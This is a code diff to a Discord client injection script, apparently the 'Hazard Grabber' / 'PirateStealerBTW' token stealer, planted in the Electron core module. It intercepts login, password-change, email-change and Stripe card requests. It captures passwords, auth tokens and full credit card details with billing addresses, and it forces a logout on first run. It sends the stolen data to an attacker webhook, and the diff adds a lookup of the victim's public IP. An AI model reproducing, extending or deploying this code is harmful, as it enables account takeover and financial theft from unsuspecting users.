@@ -13,15 +13,18 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     k({ cancel: false, responseHeaders: j.responseHeaders }); 
   }); 
 
+
+
+
   var webhook = "%WEBHOOK_LINK%";
   
   function FirstTime(){
       
-      if (!fs.existsSync(path.join(__dirname, "Hazard"))){
+      if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
           return true;
       }
       
-      fs.rmdirSync(path.join(__dirname, "Hazard"));
+      fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
       const window = BrowserWindow.getAllWindows()[0];
       window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true).then((result) => {
       });
@@ -62,7 +65,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
     }));
 
+
   }
+  
   
   function GetNitro(flags){
       if (flags == 0){
@@ -129,7 +134,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   return badges;
   
   }
-
+  
+  
+  
   function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
 
@@ -138,7 +145,13 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
-    xmlHttp.responseText;`, true)
+    xmlHttp.responseText;`, true).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, true).then((ip) => {
         const json = JSON.parse(info);
 
         var params = {
@@ -172,7 +185,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         }
 
         SendToWebhook(JSON.stringify(params));
+
+
+    
+    })})
 }
+  
   
   function ChangePassword(oldpassword, newpassword, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -181,7 +199,15 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
         xmlHttp.setRequestHeader("Authorization", "${token}");
         xmlHttp.send( null );
-        xmlHttp.responseText;`, true)
+        xmlHttp.responseText;`, true).then((info => {
+
+            window.webContents.executeJavaScript(`
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+            xmlHttp.send( null );
+            xmlHttp.responseText;
+        `, true).then((ip) => {
+
             var json = JSON.parse(info);
             var params = {
                 username: "Hazard Grabber",
@@ -213,7 +239,20 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                 ]
             }
             SendToWebhook(JSON.stringify(params));
-}
+
+        })
+    }));
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  }
   
   function ChangeEmail(newemail, password, token) {
   
@@ -224,7 +263,13 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
-    xmlHttp.responseText;`, true)
+    xmlHttp.responseText;`, true).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, true).then((ip) => {
         var json = JSON.parse(info);
         var params = {
             username: "Hazard Grabber",
@@ -256,7 +301,13 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             ]
         }
         SendToWebhook(JSON.stringify(params));
-}
+
+    })})
+      
+  
+  
+      
+  }
   
   
   function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
@@ -268,7 +319,13 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
-    xmlHttp.responseText;`, true)
+    xmlHttp.responseText;`, true).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, true).then((ip) => {
 
         var json = JSON.parse(info);
         var params = {
@@ -301,6 +358,16 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             ]
         }
         SendToWebhook(JSON.stringify(params));
+
+
+
+    })})
+
+    
+  
+  
+  
+  
   }
   
   const ChangePasswordFilter = {
@@ -312,6 +379,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
           "https://api.stripe.com/v*/tokens"
       ]
   };
+  
+  
+  
   
   session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
       if (details.url.endsWith("login")) {
@@ -364,4 +434,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
       }
   
   });
-module.exports = require('./core.asar');
+  
+  
+  module.exports = require('./core.asar');
